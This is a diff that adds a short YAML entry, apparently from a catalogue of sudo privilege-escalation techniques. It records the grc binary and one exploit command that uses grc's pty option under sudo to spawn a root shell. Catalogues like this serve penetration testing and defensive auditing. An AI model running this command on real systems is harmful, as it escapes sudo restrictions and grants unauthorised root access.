@@ -1,0 +1,4 @@
+name: grc
+binary_path: /usr/bin/grc
+exploit_cmds:
+- sudo /usr/bin/grc --pty /bin/sh
